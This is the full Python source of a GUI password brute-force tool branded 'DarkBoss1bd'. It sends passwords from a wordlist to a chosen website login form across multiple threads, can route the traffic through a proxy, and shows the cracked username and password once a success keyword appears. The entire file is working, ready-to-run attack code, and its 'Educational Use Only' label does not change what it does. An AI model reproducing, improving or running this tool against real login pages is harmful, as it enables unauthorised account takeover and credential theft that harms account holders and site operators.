import tkinter as tk
from tkinter import filedialog, messagebox
import requests
import threading
import time
import os
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ======================
# ASCII BANNER ANIMATION
# ======================
def show_banner():
    banner = f"""
{Fore.RED}╦┌─┌─┐┌┬┐  ╔═╗┬ ┬┌─┐┬─┐  ╔═╗  ╔╗╔┌─┐┬─┐┬┌─┐┌┐┌┌─┐┬─┐
{Fore.RED}╠┴┐├─┤ │   ╠═╝│ │├─┤├┬┘  ╠═╣  ║║║├┤ ├┬┘│├─┤│││├┤ ├┬┘
{Fore.RED}╩ ┴┴ ┴ ┴   ╩  └─┘┴ ┴┴└─  ╩ ╩  ╝╚╝└─┘┴└─┴┴ ┴┘└┘└─┘┴└─
{Fore.CYAN}          [!] DarkBoss1bd Bruteforce Tool
{Fore.YELLOW}          [!] Simple & Clean Version
{Fore.GREEN}          [✓] Multi-threading + Proxy Support
{Style.RESET_ALL}
"""
    for line in banner.strip().split('\n'):
        print(line)
        time.sleep(0.05)

show_banner()

# ======================
# Main Bruteforce Tool
# ======================
class SimpleBruteforceTool:
    def __init__(self, root):
        self.root = root
        self.root.title("darkboss1bd - Simple Bruteforce Tool")
        self.root.geometry("650x550")
        self.root.resizable(False, False)
        self.root.config(bg="#1e1e1e")

        self.running = False
        self.threads = []

        self.setup_gui()

    def setup_gui(self):
        # Title
        title = tk.Label(self.root, text="💀 darkboss1bd Bruteforce Tool",
                         font=("Consolas", 16, "bold"), fg="#00ff00", bg="#1e1e1e")
        title.pack(pady=10)

        subtitle = tk.Label(self.root, text="Clean Version | No Bloat",
                            font=("Arial", 10), fg="#aaaaaa", bg="#1e1e1e")
        subtitle.pack(pady=5)

        # Frame
        frame = tk.Frame(self.root, bg="#2e2e2e", padx=20, pady=20)
        frame.pack(pady=10, fill="both", expand=True)

        # Target URL
        tk.Label(frame, text="Login URL:", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=0, column=0, sticky="w", pady=5)
        self.url_entry = tk.Entry(frame, width=50, font=("Arial", 10), bg="#444", fg="white")
        self.url_entry.grid(row=0, column=1, pady=5)

        # Username
        tk.Label(frame, text="Username:", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=1, column=0, sticky="w", pady=5)
        self.username_entry = tk.Entry(frame, width=50, font=("Arial", 10), bg="#444", fg="white")
        self.username_entry.grid(row=1, column=1, pady=5)

        # Password List (Wordlist)
        tk.Label(frame, text="Password File:", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=2, column=0, sticky="w", pady=5)
        self.wordlist_entry = tk.Entry(frame, width=40, font=("Arial", 10), bg="#444", fg="white", state='readonly')
        self.wordlist_entry.grid(row=2, column=1, pady=5, sticky="w")
        tk.Button(frame, text="Browse", command=self.load_wordlist, bg="#005f87", fg="white").grid(row=2, column=1, sticky="e", padx=10)

        # Proxy (Optional)
        tk.Label(frame, text="Proxy (Optional):", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=3, column=0, sticky="w", pady=5)
        self.proxy_entry = tk.Entry(frame, width=50, font=("Arial", 10), bg="#444", fg="white")
        self.proxy_entry.insert(0, "http://ip:port")
        self.proxy_entry.bind("<FocusIn>", self.clear_placeholder)
        self.proxy_entry.grid(row=3, column=1, pady=5)

        # Success Keyword
        tk.Label(frame, text="Success Text:", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=4, column=0, sticky="w", pady=5)
        self.keyword_entry = tk.Entry(frame, width=50, font=("Arial", 10), bg="#444", fg="white")
        self.keyword_entry.insert(0, "welcome")
        self.keyword_entry.grid(row=4, column=1, pady=5)

        # Threads
        tk.Label(frame, text="Threads:", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=5, column=0, sticky="w", pady=5)
        self.thread_var = tk.StringVar(value="5")
        tk.Spinbox(frame, from_=1, to=20, textvariable=self.thread_var, width=10, font=("Arial", 10), bg="#444", fg="white").grid(row=5, column=1, sticky="w", pady=5)

        # Buttons
        btn_frame = tk.Frame(frame, bg="#2e2e2e")
        btn_frame.grid(row=6, column=0, columnspan=2, pady=15)

        self.start_btn = tk.Button(btn_frame, text="🚀 START", command=self.start_attack,
                                   bg="#00aa00", fg="white", font=("Arial", 10, "bold"), width=12)
        self.start_btn.grid(row=0, column=0, padx=10)

        self.stop_btn = tk.Button(btn_frame, text="🛑 STOP", command=self.stop_attack,
                                  bg="#aa0000", fg="white", font=("Arial", 10, "bold"), width=12, state="disabled")
        self.stop_btn.grid(row=0, column=1, padx=10)

        # Log Box
        log_label = tk.Label(self.root, text="Logs:", font=("Arial", 10), fg="white", bg="#1e1e1e")
        log_label.pack(pady=(10, 5))

        self.log_text = tk.Text(self.root, height=10, width=75, bg="#111", fg="#00ff00", font=("Courier", 9))
        self.log_text.pack(padx=20, pady=5)
        self.log_text.config(state="disabled")

        # Footer
        footer = tk.Label(self.root, text="⚠️ Educational Use Only",
                          font=("Arial", 8), fg="#ff5555", bg="#1e1e1e")
        footer.pack(pady=5)

    def clear_placeholder(self, event):
        if self.proxy_entry.get() == "http://ip:port":
            self.proxy_entry.delete(0, tk.END)
            self.proxy_entry.config(fg="white")

    def log(self, message, color="white"):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")

    def load_wordlist(self):
        path = filedialog.askopenfilename(title="Select Password File", filetypes=[("Text Files", "*.txt")])
        if path:
            self.wordlist_entry.config(state='normal')
            self.wordlist_entry.delete(0, tk.END)
            self.wordlist_entry.insert(0, path)
            self.wordlist_entry.config(state='readonly')
            self.log(f"[✓] Loaded: {os.path.basename(path)}", "green")

    def start_attack(self):
        url = self.url_entry.get().strip()
        username = self.username_entry.get().strip()
        wordlist = self.wordlist_entry.get().strip()
        proxy_input = self.proxy_entry.get().strip()
        keyword = self.keyword_entry.get().strip()
        try:
            threads = int(self.thread_var.get())
            threads = max(1, min(threads, 20))
        except:
            messagebox.showerror("Error", "Invalid thread number!")
            return

        if not url or not username or not wordlist or not os.path.exists(wordlist):
            messagebox.showerror("Error", "Please fill all fields and select a valid wordlist.")
            return

        self.running = True
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.log(f"[+] Attack started on: {url}", "green")

        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read file: {e}")
            self.stop_attack()
            return

        # Proxy setup
        proxies = None
        if proxy_input and proxy_input != "http://ip:port":
            proxies = {
                'http': proxy_input,
                'https': proxy_input
            }
            self.log(f"[✓] Using proxy: {proxy_input}")

        # Split passwords for threading
        chunk_size = len(passwords) // threads
        for i in range(threads):
            start = i * chunk_size
            end = len(passwords) if i == threads - 1 else (i + 1) * chunk_size
            thread_passwords = passwords[start:end]
            thread = threading.Thread(
                target=self.try_passwords,
                args=(url, username, thread_passwords, proxies, keyword)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

    def try_passwords(self, url, username, passwords, proxies, keyword):
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})

        for password in passwords:
            if not self.running:
                break

            try:
                data = {
                    'username': username,
                    'password': password
                }
                response = session.post(url, data=data, proxies=proxies, timeout=10)

                if keyword.lower() in response.text.lower():
                    self.log(f"[🎉 SUCCESS] {username}:{password}", "green")
                    self.running = False
                    self.stop_attack()
                    self.root.after(0, lambda: messagebox.showinfo("Cracked!", f"Password found: {password}"))
                    return
                else:
                    self.log(f"[✗] Failed: {username}:{password}", "red")
            except Exception as e:
                self.log(f"[⚠️] Error: {str(e)}", "yellow")

    def stop_attack(self):
        self.running = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log("[🛑] Attack stopped.", "yellow")

# ======================
# Run Application
# ======================
if __name__ == "__main__":
    root = tk.Tk()
    app = SimpleBruteforceTool(root)
    root.mainloop()
